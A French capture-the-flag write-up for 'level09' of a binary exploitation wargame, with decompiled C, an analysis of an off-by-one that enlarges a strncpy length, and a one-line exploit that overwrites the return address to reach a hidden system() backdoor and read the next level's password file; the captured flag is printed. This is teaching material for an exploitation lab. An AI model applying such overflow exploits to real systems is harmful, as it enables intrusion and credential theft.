# override: [level09]

Observations:
---

#### Détails du profil:
```sh
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
```

#### Détails du programme:
```sh
-rwsr-s---+ 1 end     users   12959 Oct  2  2016 level09
```

#### Programme décompilé:
```c
//----- (000000000000088C) ----------------------------------------------------
int secret_backdoor()
{
  char s[128];

  fgets(s, 128, stdin);
  return system(s);
}

//----- (00000000000008C0) ----------------------------------------------------
int handle_msg()
{
  char v1[140];
  char v2[40];
  int v3;

  memset(v2, 0, sizeof(v2));
  v3 = 140;
  set_username((__int64)v1);
  set_msg((__int64)v1);
  return puts(">: Msg sent!");
}

//----- (0000000000000932) ----------------------------------------------------
char *__fastcall set_msg(__int64 a1)
{
  char s[1024];

  memset(s, 0, sizeof(s));
  puts(">: Msg @Unix-Dude");
  printf(">>: ");
  fgets(s, 1024, stdin);
  return strncpy((char *)a1, s, *(int *)(a1 + 180));
}

//----- (00000000000009CD) ----------------------------------------------------
int __fastcall set_username(__int64 a1)
{
  char s[140];
  int i;

  memset(s, 0, 0x80uLL);
  puts(">: Enter your username");
  printf(">>: ");
  fgets(s, 128, stdin);
  for ( i = 0; i <= 40 && s[i]; ++i )
    *(_BYTE *)(a1 + i + 140) = s[i];
  return printf(">: Welcome, %s", (const char *)(a1 + 140));
}

//----- (0000000000000AA8) ----------------------------------------------------
int __fastcall main(int argc, const char **argv, const char **envp)
{
  puts(
    "--------------------------------------------\n"
    "|   ~Welcome to l33t-m$n ~    v1337        |\n"
    "--------------------------------------------");
  handle_msg();
  return 0;
}
```

#### Fonctions:

| Nom | Description |
| --- | ----------- |
| `<main>`				| Affiche un message de bienvenue et appelle la fonction `<handle_msg>`. |
| `<handle_msg>`		| Déclare un tableau `v1` de **140** octets défini à **0**, et un tableau `v2` de **40** octets, ainsi qu'un entier `v3` défini à **140**. <br> Ensuite elle appel les fonctions `<set_username>` et `<set_msg>` chacune avec `v1` en paramètres. <br> Puis fini par afficher un message de succès. |
| `<set_username>`		| Déclare un tableau `s` de **140** octets défini à **0**, et un entier `i`, et affiche des message d'entrées. <br> Elle fais ensuite appel à `<fgets>` pour stocker **128** caractères de l'entrée standard dans `s`. <br> Puis survient une boucle qui copie **41** octets de `s` vers `a1` soit le tableau passsé en paramètre. <br> Elle finie par afficher un message de bienvenue suivi du tableau `s`. |
| `<set_msg>`			| Déclare un tableau `s` de **1024** octets défini à **0**, et affiche des message d'entrées. <br> Elle fais ensuite appel à `<fgets>` pour stocker **1024** caractères de l'entrée standard dans `s`. <br> Puis effectue un appel à `<strncpy>` pour stocker dans `a1` soit le tableau passsé en paramètre le contenu présent dans `s`. <br> Cet appel à `<strncpy>` a comme paramètre la valeur stockée à `a1` + **180** soit un octet de l'entier `v3` de la fonction `<handle_msg>`. |
| `<secret_backdoor>`	| Récupère **128** octets de l'entrée standard dans un tableau de **128** octets puis le passe en paramètre de la fonction `<system>`. |


#### Conclusions:
Nous pouvons faire un dépassement de mémoire dans la fonction `<handle_msg>` et donc rediriger l'exécution du programme. \
Cela est possible car nous pouvons changer la variable `v3` de la fonction `<handle_msg>` grace à la boucle dans `<set_username>`. \
Alors l'appel à `<set_msg>` nous permettra d'injecter jusqu'à **255** octets dans la pile de la fonction `<handle_msg>`. \
En effet l'appel à `<strncpy>` utilise la variable `v3`. \
Nous pouvons ainsi de modifier l'addresse de retour de la fonction `<handle_msg>`.

----
Résolution:
----

Nous allons remplir le tableau de la fonction `<set_username>` avec **40** caractères de décalage, \
puis la valeur permettant d'atteindre l'addresse de retour de `<handle_msg>` à partir de `v1`. \
Suivit de **86** caractères de bourrage pour satisfaire le premier appel à `<fgets>`. \
Ensuite nous ajoutons **200** caractères de décalage puis les **2** octets bas de l'addresse de `<secret_backdoor>`.

> Nous changeons seulement les **2** octets les plus bas car le programme est compilé avec `-fpie` \
> Ce qui rend les **6** octets hauts de l'emplacement de ses fonctions aléatoire, mais toujours relatif au main ! 

#### Commande:
```bash
(echo $(python -c "print('a'*40 + '\xca' + 'b'*86 + 'c'*200 + '\x48\x8c'[::-1])"); echo 'cat /home/users/end/.pass') | /home/users/level09/level09
```

#### Flag: `j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE`